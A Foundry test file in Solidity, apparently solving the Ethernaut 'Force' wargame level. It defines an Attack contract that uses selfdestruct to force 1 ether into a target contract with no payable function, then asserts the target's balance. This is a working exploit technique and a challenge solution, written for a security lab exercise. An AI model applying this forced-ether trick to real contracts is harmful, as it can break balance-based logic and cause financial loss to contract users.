// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/Test.sol";
import "forge-std/console.sol";
import { Force } from "../src/Force.sol";


contract Attack {

    constructor() public payable {}

    function AttackForce(address payable target) public {
        selfdestruct(target);
    }
}

contract ForceTest is Test {
    Force force;
    Attack attack;

    function setUp() public {
        force = new Force();
        attack = new Attack();
    }

    function test_AttackForce() public payable {
        attack = new Attack{value: 1 ether}();

        attack.AttackForce(payable(address(force)));

        console.log("Force balance: ", address(force).balance);
        assertEq(address(force).balance, 1 ether);

    }


}

